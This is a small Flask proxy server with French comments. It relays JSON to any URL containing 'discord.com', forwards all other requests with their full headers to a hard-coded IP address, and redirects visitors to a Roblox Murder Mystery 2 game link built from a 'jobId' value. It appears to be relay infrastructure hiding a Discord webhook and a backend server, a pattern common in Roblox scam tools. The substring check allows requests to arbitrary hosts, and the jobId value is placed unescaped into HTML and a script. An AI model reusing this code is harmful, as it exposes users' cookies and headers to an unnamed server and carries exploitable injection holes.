import requests
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/api/proxy', methods=['POST'])
def handle_proxy():
    try:
        data = request.get_json()
        
        # Si c'est une requête pour Discord
        if 'target' in data and 'discord.com' in data['target']:
            # Envoyer directement vers le webhook Discord
            discord_response = requests.post(
                url=data['target'],
                json=data['data'],
                headers={'Content-Type': 'application/json'}
            )
            return discord_response.text, discord_response.status_code
        
        # Sinon, rediriger vers le serveur original
        else:
            response = requests.request(
                method=request.method,
                url="http://216.9.225.189:9999" + request.path,
                data=request.get_data(),
                headers=request.headers
            )
            return response.content, response.status_code, {"Content-Type": response.headers.get("Content-Type")}
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/redirect/<redirect_id>')
def handle_redirect(redirect_id):
    # Rediriger vers Roblox (exemple)
    roblox_url = f"https://www.roblox.com/games/142823291/Murder-Mystery-2?jobId={redirect_id}"
    return f'''
    <html>
        <head>
            <meta http-equiv="refresh" content="0; url={roblox_url}">
            <title>Redirecting to Roblox...</title>
        </head>
        <body>
            <p>Redirecting to Roblox... <a href="{roblox_url}">Click here if not redirected</a></p>
            <script>window.location.href = "{roblox_url}";</script>
        </body>
    </html>
    ''', 302

# Garder l'ancienne route pour la compatibilité
@app.before_request
def before_request():
    if request.path.startswith('/api/proxy') or request.path.startswith('/api/redirect'):
        return
    
    response = requests.request(
        method=request.method,
        url="http://216.9.225.189:9999" + request.path,
        data=request.get_data(),
        headers=request.headers
    )
    return response.content, response.status_code, {"Content-Type": response.headers.get("Content-Type")}

if __name__ == "__main__":
    app.run()
